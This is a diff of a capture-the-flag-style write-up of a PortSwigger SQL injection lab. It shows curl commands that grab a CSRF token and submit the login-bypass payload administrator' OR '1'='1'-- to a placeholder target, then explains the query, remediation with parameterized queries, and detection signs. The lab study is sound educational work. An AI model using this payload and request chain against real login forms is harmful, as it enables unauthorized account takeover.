@@ -20,9 +20,10 @@ The entire lab was performed from an iPhone using iSH rather than a traditional 
 1. Reconnaissance
 
 I started by sending an HTTP request to the target using curl:
-curl -i "https://TARGET/"
-The response confirmed that the target was a PortSwigger SQL injection lab.
 
+curl -i "https://TARGET/
+
+The response confirmed that the target was a PortSwigger SQL injection lab.
 I then investigated the application’s login functionality and identified the /login endpoint.
 
 ⸻
@@ -30,15 +31,23 @@ I then investigated the application’s login functionality and identified the /
 2. Identifying the Login Form
 
 The login page was retrieved with:
+
 curl -s "https://TARGET/login"
+
 The HTML contained a login form using the POST method:
+
 <form class=login-form method=POST action="/login">
+
 The form accepted three relevant parameters:
+
 csrf
 username
 password
+
 This established that authentication was performed through:
+
 POST /login
+
 environment.
 
 ⸻
@@ -46,3 +55,231 @@ environment.
 3. Handling the CSRF Token
 
 The application included a CSRF token, so I first retrieved the login page while saving the session cookies:
+
+curl -s -c cookies.txt \
+"https://TARGET/login" \
+-o login.html
+
+The CSRF token was extracted from the HTML:
+
+grep -o 'name="csrf" value="[^"]*"' login.html
+
+then stored the token in a shell variable:
+
+CSRF=$(grep -o 'name="csrf" value="[^"]*"' login.html \
+| sed 's/.*value="//;s/"$//')
+
+The session cookies were stored in cookies.txt and reused for the subsequent authentication request.
+
+⸻
+
+4. Testing the SQL Injection
+
+The username parameter was tested with the following payload:
+
+administrator' OR '1'='1'--
+
+The login request was manually constructed with curl:
+
+curl -i -b cookies.txt -c cookies.txt \
+-X POST \
+"https://TARGET/login" \
+--data-urlencode "csrf=$CSRF" \
+--data-urlencode "username=administrator' OR '1'='1'--" \
+--data-urlencode "password=x"
+
+The password was intentionally set to an invalid value because the objective was to bypass the password verification.
+
+⸻
+
+5. Understanding the Injection
+
+A vulnerable authentication query could conceptually resemble:
+
+SELECT * FROM users
+WHERE username = 'USER_INPUT'
+AND password = 'PASSWORD_INPUT';
+
+The supplied username:
+
+administrator' OR '1'='1'--
+
+changes the structure of the query.
+Conceptually, it can result in something similar to:
+
+SELECT * FROM users
+WHERE username = 'administrator'
+OR '1'='1'--'
+AND password = 'x';
+
+The injection consists of three important components:
+String termination
+'
+This closes the original username string.
+
+Always-true condition
+OR '1'='1'
+This introduces a condition that evaluates to true.
+
+SQL comment
+--
+This comments out the remaining portion of the SQL statement.
+Because the application failed to properly separate user input from SQL syntax, the injected input altered the logic of the authentication query.
+
+⸻
+
+6. Successful Authentication
+The server responded with an HTTP redirect:
+
+HTTP/2 302
+Location: /my-account?id=administrator
+
+A session cookie was also issued.
+This indicated that the application had accepted the authentication request and redirected the session to the administrator's account page.
+
+⸻
+
+7. Verifying Administrator Access
+I reused the authenticated session cookie to request the account page:
+
+curl -s -b cookies.txt \
+"https://TARGET/my-account?id=administrator"
+
+The response contained:
+
+My Account
+
+Your username is: administrator
+
+This confirmed that the session was authenticated as the administrator.
+The PortSwigger lab subsequently reported that the lab had been successfully solved
+
+⸻
+
+8. Attack Chain
+Reconnaissance
+      |
+      v
+Identify /login
+      |
+      v
+Identify POST parameters
+      |
+      v
+Retrieve CSRF token
+      |
+      v
+Maintain session cookies
+      |
+      v
+Inject into username parameter
+      |
+      v
+SQL query logic altered
+      |
+      v
+Authentication bypass
+      |
+      v
+Administrator session
+      |
+      v
+Verify /my-account
+
+⸻
+
+9. Impact
+SQL injection in an authentication mechanism can allow an attacker to bypass authentication without possessing valid credentials.
+Depending on the application's implementation and database privileges, SQL injection may potentially allow:
+
+Authentication bypass
+Unauthorized access to accounts
+Access to sensitive database information
+Modification or deletion of database records
+Privilege escalation
+Further compromise of application functionality
+
+In this lab, the demonstrated impact was authentication bypass resulting in administrator access.
+
+⸻
+
+10. Root Cause
+The root cause is unsafe handling of user-controlled input within an SQL query.
+The application allowed the contents of the username parameter to influence the SQL syntax itself.
+Instead of treating the username strictly as data, the application effectively allowed the attacker to introduce SQL operators and comments into the query.
+
+⸻
+
+11. Remediation
+The primary mitigation is to use parameterized queries or prepared statements.
+For example:
+
+cursor.execute(
+    "SELECT * FROM users WHERE username = ? AND password = ?",
+    (username, password)
+)
+
+The application should also:
+Avoid constructing SQL queries through string concatenation.
+Use secure password hashing such as Argon2 or bcrypt.
+Apply least-privilege permissions to the application's database account.
+Validate and handle unexpected input appropriately.
+Monitor authentication logs for suspicious SQL-like input.
+Use a WAF as an additional security layer where appropriate.
+
+Input validation alone should not be considered a replacement for parameterized SQL queries.
+
+⸻
+
+12. Blue Team Perspective
+From a defensive perspective, this attack could leave several observable indicators.
+A web server or application log might contain a request resembling:
+
+POST /login
+username=administrator' OR '1'='1'--
+
+A SOC could correlate:
+
+Suspicious SQL syntax
+        +
+Login endpoint
+        +
+Authentication attempt
+        +
+Successful authentication
+        +
+Privileged account access
+
+Rather than relying on a single keyword such as OR, detection can combine request characteristics with authentication and application activity.
+Useful telemetry could include:
+
+Web server access logs
+Application authentication logs
+WAF alerts
+Source IP information
+User-agent information
+Authentication success/failure events
+Privileged account activity
+
+This provides a useful connection between offensive testing and defensive monitoring.
+
+⸻
+
+13. Environment
+This lab was completed using:
+
+Device:      iPhone
+Environment: iSH
+OS:          Alpine Linux
+HTTP Tool:   curl
+Processing:  grep / sed
+Target:      PortSwigger Web Security Academy
+
+No Kali Linux installation or desktop penetration-testing framework was required.
+
+⸻
+
+Conclusion:
+This lab demonstrated how a SQL injection vulnerability in a login mechanism can be used to bypass authentication and obtain administrator access.
+The exercise also provided practical experience with manually interacting with a web application at the HTTP level
+The key security lesson is that user-controlled input must never be allowed to alter the structure of an SQL query. Parameterized queries and proper database privilege management are fundamental defenses against SQL injection.
